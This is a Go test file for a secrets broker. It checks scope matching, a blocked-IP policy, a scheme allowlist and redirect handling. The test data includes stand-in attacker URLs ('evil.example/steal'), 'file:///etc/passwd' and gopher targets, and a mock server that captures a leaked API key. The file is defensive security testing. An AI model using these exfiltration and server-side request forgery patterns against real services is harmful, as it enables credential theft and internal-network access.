package secrets

import (
	"bytes"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

// recordingTransport captures where a request was actually sent and what
// credential went with it, without needing DNS or a live host.
type recordingTransport struct {
	gotHost   string
	gotHeader string
}

func (t *recordingTransport) RoundTrip(r *http.Request) (*http.Response, error) {
	t.gotHost = r.URL.Host
	t.gotHeader = r.Header.Get("Authorization")
	return &http.Response{
		StatusCode: 200,
		Body:       io.NopCloser(bytes.NewReader([]byte(`{"ok":true}`))),
		Header:     make(http.Header),
	}, nil
}

// TestBrokerScopeRejectsHostSuffixBypass is the property SECURITY.md states:
//
//	"Scope matching is origin-exact + path-prefix ... This blocks the classic
//	prefix bypass (https://api.github.com does NOT authorize
//	https://api.github.com.evil.com)."
//
// A raw string-prefix check satisfies "https://api.github.com.evil.com"
// starting with "https://api.github.com", so the grant matches and the broker
// injects the credential into a request aimed at a host the user never
// authorized. That is credential exfiltration, reachable by anyone able to
// call the broker with a valid grant token.
func TestBrokerScopeRejectsHostSuffixBypass(t *testing.T) {
	v, b := testVault(t)
	if err := v.Initialize("correct horse battery"); err != nil {
		t.Fatal(err)
	}
	if err := v.Put("api-key", "super-secret-value", nil); err != nil {
		t.Fatal(err)
	}
	rec := &recordingTransport{}
	b.Client = &http.Client{Transport: rec}

	token, err := b.Grant(GrantSpec{Secret: "api-key", Grantee: "agent", Scope: "https://api.github.com", TTLSeconds: 900})
	if err != nil {
		t.Fatal(err)
	}

	_, err = b.Use(token, "GET", "https://api.github.com.evil.example/steal", "Authorization", "")
	if err == nil {
		t.Fatalf("grant scoped to https://api.github.com authorized a request to "+
			"https://api.github.com.evil.example — the credential was sent to host %q "+
			"with header %q", rec.gotHost, rec.gotHeader)
	}
	if !strings.Contains(err.Error(), "scope") {
		t.Fatalf("expected a scope rejection, got %v", err)
	}
	if rec.gotHost != "" {
		t.Fatalf("request was dispatched to %q despite the error", rec.gotHost)
	}
}

// Related shapes of the same bug: a different scheme or port is a different
// origin, and neither may be reached by a grant scoped to the other.
func TestBrokerScopeIsOriginExact(t *testing.T) {
	v, b := testVault(t)
	if err := v.Initialize("correct horse battery"); err != nil {
		t.Fatal(err)
	}
	if err := v.Put("api-key", "value", nil); err != nil {
		t.Fatal(err)
	}
	rec := &recordingTransport{}
	b.Client = &http.Client{Transport: rec}
	token, err := b.Grant(GrantSpec{Secret: "api-key", Grantee: "agent", Scope: "https://api.example.com/v1", TTLSeconds: 900})
	if err != nil {
		t.Fatal(err)
	}

	for _, target := range []string{
		"https://api.example.com.evil.test/v1/x",       // host suffix
		"https://evil.test/https://api.example.com/v1", // scope as a path
		"http://api.example.com/v1/x",                  // scheme downgrade
		"https://api.example.com:8443/v1/x",            // different port
		"https://api.example.com/v2/x",                 // outside the path prefix
	} {
		if _, err := b.Use(token, "GET", target, "Authorization", ""); err == nil {
			t.Errorf("grant scoped to https://api.example.com/v1 allowed %s", target)
		}
	}
}

// The legitimate case must keep working: same origin, at or below the scope's
// path prefix.
func TestBrokerScopeAllowsInScopeRequests(t *testing.T) {
	v, b := testVault(t)
	if err := v.Initialize("correct horse battery"); err != nil {
		t.Fatal(err)
	}
	if err := v.Put("api-key", "value", nil); err != nil {
		t.Fatal(err)
	}
	rec := &recordingTransport{}
	b.Client = &http.Client{Transport: rec}
	token, err := b.Grant(GrantSpec{Secret: "api-key", Grantee: "agent", Scope: "https://api.example.com/v1", TTLSeconds: 900})
	if err != nil {
		t.Fatal(err)
	}
	for _, target := range []string{
		"https://api.example.com/v1",
		"https://api.example.com/v1/things",
		"https://api.example.com/v1/things?q=1",
	} {
		if _, err := b.Use(token, "GET", target, "Authorization", ""); err != nil {
			t.Errorf("in-scope request %s was rejected: %v", target, err)
		}
	}
}

// TestBrokerGuardBlocksInternalTargets pins the outbound address policy that
// SECURITY.md describes. It is asserted at the dial layer, so it also covers
// a hostname that resolves inward and a redirect that lands inward.
func TestBrokerGuardBlocksInternalTargets(t *testing.T) {
	cases := []struct {
		ip           string
		allowPrivate bool
		wantBlocked  bool
		why          string
	}{
		{"127.0.0.1", false, true, "loopback is internal"},
		{"10.1.2.3", false, true, "RFC1918 is internal"},
		{"192.168.4.5", false, true, "RFC1918 is internal"},
		{"100.72.1.1", false, true, "carrier-grade NAT is internal"},
		{"169.254.169.254", false, true, "cloud metadata"},
		{"0.0.0.0", false, true, "unspecified"},
		{"::1", false, true, "IPv6 loopback"},
		{"fd00::1", false, true, "IPv6 unique-local"},
		{"fe80::1", false, true, "IPv6 link-local"},
		{"93.184.216.34", false, false, "ordinary public address"},

		// With the self-hoster opt-in, private space opens up — and metadata
		// does not. That distinction is the whole point of the flag.
		{"127.0.0.1", true, false, "loopback allowed by opt-in"},
		{"192.168.4.5", true, false, "LAN allowed by opt-in"},
		{"169.254.169.254", true, true, "metadata stays blocked even with the opt-in"},
		{"fe80::1", true, true, "link-local stays blocked even with the opt-in"},
	}
	for _, c := range cases {
		err := blockedIP(net.ParseIP(c.ip), c.allowPrivate)
		if c.wantBlocked && err == nil {
			t.Errorf("%s (allowPrivate=%v) was allowed; %s", c.ip, c.allowPrivate, c.why)
		}
		if !c.wantBlocked && err != nil {
			t.Errorf("%s (allowPrivate=%v) was blocked (%v); %s", c.ip, c.allowPrivate, err, c.why)
		}
	}
}

// TestBrokerRefusesNonHTTPSchemes covers the scheme allowlist SECURITY.md
// claims, rather than leaving it to whichever transports are registered.
func TestBrokerRefusesNonHTTPSchemes(t *testing.T) {
	v, b := testVault(t)
	if err := v.Initialize("correct horse battery"); err != nil {
		t.Fatal(err)
	}
	if err := v.Put("api-key", "value", nil); err != nil {
		t.Fatal(err)
	}
	token, err := b.Grant(GrantSpec{Secret: "api-key", Grantee: "agent", Scope: "", TTLSeconds: 900})
	if err != nil {
		t.Fatal(err)
	}
	for _, target := range []string{
		"file:///etc/passwd",
		"gopher://127.0.0.1:70/",
		"ftp://example.com/x",
	} {
		if _, err := b.Use(token, "GET", target, "Authorization", ""); err == nil {
			t.Errorf("brokered a %s url", target)
		}
	}
}

// TestBrokerRedirectStaysInScope covers the leak Go's own header-stripping does
// not: a custom header follows a cross-host redirect untouched.
func TestBrokerRedirectStaysInScope(t *testing.T) {
	v, b := testVault(t)
	if err := v.Initialize("correct horse battery"); err != nil {
		t.Fatal(err)
	}
	if err := v.Put("api-key", "super-secret-value", nil); err != nil {
		t.Fatal(err)
	}

	var attackerSaw string
	attacker := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		attackerSaw = r.Header.Get("X-Api-Key")
		w.Write([]byte("captured"))
	}))
	defer attacker.Close()

	origin := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, attacker.URL+"/steal", http.StatusFound)
	}))
	defer origin.Close()

	token, err := b.Grant(GrantSpec{Secret: "api-key", Grantee: "agent", Scope: origin.URL, TTLSeconds: 900})
	if err != nil {
		t.Fatal(err)
	}
	if _, err := b.Use(token, "GET", origin.URL+"/thing", "X-Api-Key", ""); err == nil {
		t.Error("a redirect out of the grant scope was followed")
	}
	if attackerSaw != "" {
		t.Fatalf("credential followed a redirect to an out-of-scope host: %q", attackerSaw)
	}
}
